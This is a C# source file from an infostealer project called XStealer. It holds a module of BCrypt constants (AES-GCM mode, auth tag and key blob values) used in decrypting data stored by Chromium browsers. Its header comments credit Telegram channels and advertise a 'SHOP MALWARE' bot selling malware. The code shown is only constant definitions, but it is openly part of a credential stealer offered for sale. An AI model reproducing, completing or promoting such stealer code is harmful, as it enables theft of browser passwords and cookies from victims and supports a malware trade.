// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Browsers.Chromium
{
    using System;

    public static class BCrypt
    {
        public const uint ERROR_SUCCESS = 0x00000000, BCRYPT_PAD_PSS = 8, BCRYPT_PAD_OAEP = 4;
        public static readonly byte[] BCRYPT_KEY_DATA_BLOB_MAGIC = BitConverter.GetBytes(0x4d42444b);
        public static readonly string BCRYPT_OBJECT_LENGTH = "ObjectLength",
        BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM",
        BCRYPT_AUTH_TAG_LENGTH = "AuthTagLength",
        BCRYPT_CHAINING_MODE = "ChainingMode",
        BCRYPT_KEY_DATA_BLOB = "KeyDataBlob",
        BCRYPT_AES_ALGORITHM = "AES",
        MS_PRIMITIVE_PROVIDER = "Microsoft Primitive Provider";

        public static readonly int BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG = 0x00000001, BCRYPT_INIT_AUTH_MODE_INFO_VERSION = 0x00000001;
        public static readonly uint STATUS_AUTH_TAG_MISMATCH = 0xC000A002;
    }
}
